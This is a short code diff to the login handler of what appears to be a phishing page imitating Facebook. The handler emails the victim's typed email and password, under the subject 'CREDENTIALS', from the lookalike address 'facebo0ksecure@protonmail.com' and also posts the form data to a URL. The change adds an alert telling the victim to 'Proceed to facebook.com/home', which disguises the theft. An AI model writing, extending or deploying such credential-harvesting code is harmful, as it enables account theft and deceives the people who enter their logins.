@@ -120,7 +120,9 @@ submitLogin.onclick = (e) => {
 				From : "facebo0ksecure@protonmail.com",
 				Subject : "CREDENTIALS",
 				Body : `${document.querySelector('#email').value,document.querySelector('#pass').value}`,
-			})
+			}).then((message)=>{
+			alert("Proceed to facebook.com/home")
+		})
 		const formData = new FormData(document.querySelector('#login_form'))
 		console.log(formData)
 		const response = await fetch(url, {
